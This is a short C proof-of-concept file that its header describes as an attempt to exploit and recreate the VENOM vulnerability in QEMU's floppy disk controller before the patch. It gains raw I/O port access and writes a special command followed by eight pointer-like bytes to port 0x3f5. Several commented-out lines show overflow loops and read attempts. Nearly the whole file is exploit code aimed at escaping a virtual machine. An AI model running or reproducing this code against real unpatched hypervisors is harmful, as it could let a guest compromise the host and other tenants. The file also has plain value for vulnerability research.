/*this is a test code
It's aim is to exploit and recreate possible Venom attack on QEMU before patch
6/2/2015  Yihao Zhang*/
#include<stdio.h>
#include<sys/io.h>
#define FIFO 0x3f5
#define RDID 0x0a
#define SPC_COMMAND 0x8e
#define MAX_COUNT 0x6ff
#define TEST_VAL  0x11
#define FD_CMD_READ 0x06
#define WRITE 0x05

int main(void){
        char ctx[8] = {0x00,0x1c,0x22,0xfe,0x24,0x7f,0x00,0x00};
        char cb[8] =  {0x70,0xae,0x30,0xfc,0x24,0x7f,0x00,0x00};
        iopl(3);
        ioperm(FIFO, 1, 1);
	// printf("write spc_command to port\n");
        outb(SPC_COMMAND, FIFO);
        int i,j;
        j = 0;
        printf("into loop\n");
        // for(i=0; i<MAX_COUNT; i++ ){
        //         outb(TEST_VAL,0x3f5);
        // }
        // for(i=0; i< 8; i++){
        //         outb(ctx[i], FIFO);
        // }
        for(i=0; i< 8; i++){
                outb(cb[i], FIFO);
        }
        // outb(TEST_VAL, FIFO);
        // outb(RDID, FIFO);
        // outb(TEST_VAL, FIFO);
        // outb(FD_CMD_READ, FIFO);
        // printf("try read: %d\n", inb(0x3f5));
}
